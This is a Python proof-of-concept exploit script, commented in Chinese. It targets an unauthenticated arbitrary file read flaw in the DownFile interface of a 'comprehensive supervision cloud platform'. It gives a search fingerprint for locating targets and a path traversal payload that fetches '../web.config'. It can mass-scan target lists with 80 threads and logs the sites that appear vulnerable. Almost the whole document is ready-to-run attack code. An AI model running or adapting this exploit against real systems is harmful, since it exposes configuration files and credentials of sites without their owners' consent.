# -*- coding: utf-8 -*-
# 综合监管云平台 DownFile 任意文件读取漏洞
# body="/Download/DownFile?fileName=SetUp.exe"
# 产品简介：综合监管云平台是一种集成了多种先进技术的信息化平台，旨在通过数据采集、分析、预警和应急处理等功能，实现对各类监管对象的全面、高效、精准管理，综合监管云平台利用“互联网+物联网”模式，结合云计算、大数据、边缘计算等先进技术，构建了一个集数据采集、统计分析、监管预警、应急安全等功能于一体的信息化监管平台。该平台通过远程实时数据采集技术，实现对监管对象的实时监控和动态管理，为监管部门提供强有力的技术支持和决策依据。
# 漏洞概述：综合监管云平台 DownFile 接口存在任意文件读取漏洞，未经身份验证攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。

import requests,argparse,sys
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def banner():
    test = """ 
\x1b[38m██████╗ ███████╗ █████╗ ██████╗         ███████╗██╗██╗     ███████╗
\x1b[36m██╔══██╗██╔════╝██╔══██╗██╔══██╗        ██╔════╝██║██║     ██╔════╝
\x1b[34m██████╔╝█████╗  ███████║██║  ██║███████╗█████╗  ██║██║     █████╗  
\x1b[35m██╔══██╗██╔══╝  ██╔══██║██║  ██║╚══════╝██╔══╝  ██║██║     ██╔══╝  
\x1b[31m██║  ██║███████╗██║  ██║██████╔╝        ██║     ██║███████╗███████╗
\x1b[33m╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═════╝         ╚═╝     ╚═╝╚══════╝╚══════╝                                                                                                                                                    
                                        --author:Kucei
                                        --Version:综合监管云平台 DownFile ReadFile                                               
\x1b[0m"""
    print(test)

def main():
    banner()
    parser = argparse.ArgumentParser('综合监管云平台_DownFile_ReadFile')
    parser.add_argument('-u','--url',dest='url',type=str,help='Please Input URL')
    parser.add_argument('-f','--file',dest='file',type=str,help='Please Input File')
    args = parser.parse_args()

    # 判断url/file
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list =[]
        with open(args.file,'r',encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip())
        pool = Pool(80)
        pool.map(poc,url_list)
        pool.close()
        pool.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")

def poc(target):
    url_payload = '/Download/DownFile?fileName=../web.config'
    headers = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15',
        'Accept-Encoding': 'gzip',
        'Connection': 'close'
    }
    # proxies = {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080',}
    data = {}
    try :
        response = requests.get(url=target+url_payload,headers=headers,verify=False,timeout=5)
        # print(response.status_code)
        # print(response.text)
        if response.status_code == 200 and 'encoding' in response.text:
            print( f"[+] {target} 存在漏洞！\n")
            with open('综合监管云平台_DownFile_ReadFile.txt','a',encoding='utf-8')as f:
                f.write(target+url_payload+'\n')
                return True
        else:
            print("[-] 不存在漏洞！！")
            return False
    except Exception:
        print(target+"站点连接异常")


if __name__ == '__main__':
    main()